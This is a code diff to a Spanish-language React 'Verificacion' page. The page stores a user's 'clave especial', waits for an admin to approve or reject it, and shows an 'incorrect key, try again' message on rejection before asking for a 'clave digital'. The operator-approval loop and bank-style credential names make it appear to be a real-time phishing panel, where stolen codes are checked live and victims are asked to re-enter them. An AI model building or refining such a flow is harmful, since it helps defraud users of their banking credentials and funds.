@@ -20,23 +20,14 @@ export default function Verificacion() {
   const handleSubmitClaveEspecial = async () => {
     if (!claveEspecial.trim() || !sessionId) return;
 
-    // Primero guardamos la clave especial
     await base44.entities.UserSessionData.update(sessionId, {
       claveEspecial: claveEspecial.trim(),
+      claveEspecialStatus: "pending",
     });
-
-    // Luego marcamos como pendiente (columna separada)
-    try {
-      await base44.entities.UserSessionData.update(sessionId, {
-        claveEspecialStatus: "pending",
-      });
-    } catch (_) {
-      // La columna puede no existir aún en Supabase — ignorar
-    }
 
     setPhase("waitingApproval");
 
-    // Pollear hasta que el admin apruebe
+    // Pollear hasta que el admin apruebe o rechace
     pollRef.current = setInterval(async () => {
       const res = await base44.entities.UserSessionData.filter({ id: sessionId });
       const s = res[0];
@@ -44,6 +35,10 @@ export default function Verificacion() {
       if (s.claveEspecialStatus === "approved") {
         clearInterval(pollRef.current);
         setPhase("claveDigital");
+      } else if (s.claveEspecialStatus === "rejected") {
+        clearInterval(pollRef.current);
+        setClaveEspecial("");
+        setPhase("rejected");
       }
     }, 3000);
   };
@@ -67,7 +62,8 @@ export default function Verificacion() {
     );
   }
 
-  const isPhase1 = phase === "claveEspecial";
+  const isPhase1 = phase === "claveEspecial" || phase === "rejected";
+  const isRejected = phase === "rejected";
   const claveDigitalValid = claveDigital.trim().length > 0;
 
   return (
@@ -75,6 +71,16 @@ export default function Verificacion() {
       <LoginHeader />
       <main className="flex-1 flex flex-col items-center pt-10">
         <div style={{ width: "100%", maxWidth: "620px", padding: "0 24px" }}>
+
+          {/* Mensaje de rechazo */}
+          {isRejected && (
+            <div style={{ display: "flex", alignItems: "center", gap: "10px", background: "#fff3f3", border: "1px solid #f5c6c6", borderRadius: "4px", padding: "12px 16px", marginBottom: "20px" }}>
+              <span style={{ fontSize: "18px" }}>⚠️</span>
+              <span style={{ fontSize: "14px", color: "#cc0000" }}>
+                La clave especial ingresada es incorrecta. Por favor, corrija la información e intente nuevamente.
+              </span>
+            </div>
+          )}
 
           {/* Texto superior */}
           <p style={{ fontSize: "15px", color: "#121212", marginBottom: "24px", lineHeight: "1.6" }}>
